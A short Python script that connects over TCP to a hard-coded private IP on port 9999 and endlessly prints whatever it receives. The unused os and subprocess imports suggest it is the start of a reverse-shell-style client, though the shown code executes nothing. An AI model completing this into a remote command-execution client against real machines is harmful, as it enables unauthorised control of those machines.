import socket
import os
import subprocess


client_socket = socket.socket()
host = "10.228.164.137"
port = 9999
client_socket.connect((host, port))


while True:
    data = str(client_socket.recv(1024), "utf-8")
    print(data, end=" ")

